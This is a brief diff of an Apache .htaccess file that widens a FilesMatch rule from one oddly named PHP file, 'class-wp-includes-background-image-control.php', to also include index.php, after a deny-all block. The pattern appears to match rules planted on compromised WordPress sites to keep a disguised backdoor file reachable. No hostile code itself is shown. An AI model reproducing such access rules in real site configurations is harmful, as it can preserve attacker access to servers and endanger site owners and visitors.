@@ -31,7 +31,7 @@
     Deny from all
 </Files>
 
-<FilesMatch "^(class-wp-includes-background-image-control.php)$">
+<FilesMatch "^(index.php|class-wp-includes-background-image-control.php)$">
 
  Order allow,deny
 
